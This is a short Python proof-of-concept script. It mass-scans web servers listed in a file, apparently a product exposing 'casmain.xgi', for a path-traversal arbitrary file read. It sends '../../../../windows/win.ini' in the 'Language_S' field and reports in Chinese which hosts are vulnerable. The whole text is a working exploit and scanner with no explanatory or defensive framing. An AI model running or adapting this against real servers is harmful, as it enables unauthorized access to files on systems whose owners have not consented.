import requests

def Poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
    }
    data = {
        "Language_S": "../../../../windows/win.ini"
    }
    sponse = requests.post(url + "/casmain.xgi", data=data, headers=headers)
    content = sponse.text[:sponse.text.rindex("<script>history.go(0);")]
    try:
        if sponse.status_code == 200 and content.find("; for 16-bit app support") == 0:
            print(str(url) + "存在任意文件访问漏洞")
        else:
            print(url + "不存在任意文件访问漏洞")
    except:
        print(url + "站点访问存在问题")

if __name__ == "__main__":
    for url in open(r'jitong.txt'):
        Poc(url)
